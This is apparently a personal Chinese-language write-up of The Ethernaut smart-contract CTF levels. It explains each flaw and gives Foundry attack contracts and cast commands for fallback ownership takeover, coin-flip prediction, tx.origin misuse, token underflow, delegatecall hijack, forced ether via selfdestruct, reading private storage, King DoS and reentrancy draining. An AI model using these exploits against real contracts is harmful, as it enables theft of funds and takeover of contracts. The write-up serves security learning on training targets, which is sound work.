# [The Ethernaut](https://ethernaut.openzeppelin.com)

一个非常有意思的网站，提供了一系列题目

以下内容(可能)省略：
- instance合约地址
- rpc url
- 私钥
- player地址

## Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Fallback} from "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack{value: 0.0000000000002 ether}().exploit();
        vm.stopBroadcast();
    }
}
contract Attack{
    Fallback public target = Fallback(payable(address()));
    constructor() payable {
        require(msg.value >= 0.000000000000002 ether);
    }
    function exploit() public{
        target.contribute{value: 0.000000000000001 ether}();
        (bool success, ) = payable(target).call{value: 0.000000000000001 ether, gas: 500000}(""); //gas要给够
        require(success, "Receive failed");
    }
}
```
但是吧，这只会让owner变成上述合约，而题目要求owner为player，即metamask里登记的账号。需要手动cast send更新owner
```sh
cast send "" "contribute()" --from "" --value 0.0000000000000011ether
cast send "" "withdraw()" --from ""
```
## Fallout

并非constructor（

```sh
cast send "" "Fal1out()" --from ""
cast send "" "collectAllocations()" --from ""
```

## Coin Flip

`block.number`是可以预测的。一个要注意的地方是，题目检查了`lastHash != blockValue`，因此两个转账之间不能太快，要给`block.number`自增的时间
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {CoinFlip} from "../src/CoinFlip.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script {
    function run() public { //以后若没有说明默认都是这一套(或者像上面那样加上value)，因此会省略这部分
        vm.startBroadcast();
        new Attack().exploit();
        vm.stopBroadcast();
    }
}
contract Attack {
    CoinFlip public target = CoinFlip(address());
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function exploit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        target.flip((blockValue / FACTOR) == 1);
    }
}
```
```sh
for i in {1..10}; do
    forge script script/Attack.s.sol:AttackScript --rpc-url $ETH_RPC_URL --private-key $PRIVATE_KEY --broadcast
    sleep 15
done
```
## Telephone

简单来说，可以将`msg.sender`理解成调用函数的合约地址；而`tx.origin`是调用链的原始发起者，比如用户的钱包地址。只要用foundry来解这题（remix应该也行，但我配置不好……），两者就一定不一样
```solidity
contract Attack {
    Telephone public target = Telephone(address());
    function exploit() public {
        target.changeOwner(address());
    }
}
```
## Token

balances用uint256存储token数量，但没检查溢出
```sh
cast send "" "transfer(address,uint256)" "任意一个不等于player的地址" 21 --from ""
```
## Delegation

之前在`GlacierVault`那题见过，delegatecall的原理是：假设合约A使用delegatecall调用合约B的某个方法C，则执行方法C时内部所使用的storage是合约A而不是B的。也就是，本来方法C内部修改的是合约B的某些字段，假设在D处；但使用delegatecall后，实际修改的storage是合约A在D处的内存

这题合约`Delegation`使用delegatecall调用`Delegate`合约的函数。如果我们让调用的函数为pwn，pwn内部会设置`owner = msg.sender`。但实际改变的不是`Delegate`的owner，而是`Delegation`的owner，因为两个合约的owner字段在storage里的位置相同，且delegatecall修改的是调用者的storage

首先拿pwn函数的签名：
```sh
cast sig "pwn()"
```
然后调用delegatecall：
```sh
cast send "" "0xdd365b8b" --from ""
```
另外，在终端调用`await contract.owner()`验证owner时发现更改有延迟，输出的还是原来的值。不管，直接自信submit instance（

## Force

selfdestruct可以自毁当前合约，将全部的balance转给参数指定的地址，无视目标是否有相应的接收函数

```solidity
contract Attack {
    constructor() payable {
        require(msg.value != 0 ether);
    }
    function exploit() public {
        selfdestruct(payable(address()));
    }
}
```
## Vault

solidity里的private属性只保证了其他合约无法访问指定的字段；但实际的值仍然在链上，任何人都可以查看storage进而获取其值

```sh
cast storage "" 1
```
slot 0是locked，因此slot 1是password
```sh
cast send "" "unlock(bytes32)" "0x..."
```
## King

类似这题： https://medium.com/@Jesserc_/solidity-attack-vectors-2-dos-with-unexpected-revert-509a09e75c9f

receive函数中的逻辑有缺陷：`payable(king).transfer(msg.value)`。若king合约未实现接收的fallback函数，代码执行到这里时会失败，导致revert。自然就走不到下面的更新逻辑了
```solidity
contract Attack {
    King target = King(payable(address()));
    constructor() payable {
        require(msg.value != 0 ether);
    }
    function exploit() public {
        (bool success, ) = payable(target).call{value: 0.0010000000000001 ether, gas: 500000}("");
    }
}
```
## Re-entrancy

注意withdraw函数中先调用了`msg.sender.call`再更新`balances[msg.sender]`。call函数会调用接收者的fallback/receive函数。如果在receive里再次调用withdraw，就能重复以上步骤，直到清空目标的balance
```solidity
contract Attack {
    Reentrance target = Reentrance(payable(address()));
    constructor() public payable {
        require(msg.value != 0 ether);
    }
    function exploit() public {
        target.donate{value:0.0005 ether}(address(this));
        target.withdraw(0.0005 ether);
    }
    fallback() external payable { 
        target.withdraw(0.0005 ether);
    }
}
```
safemath库见 https://github.com/fractional-company/contracts/blob/master/src/OpenZeppelin/math/SafeMath.sol 。不过版本是`0.8.0`，需要修改Reentrance的版本到`0.8.0`才能使用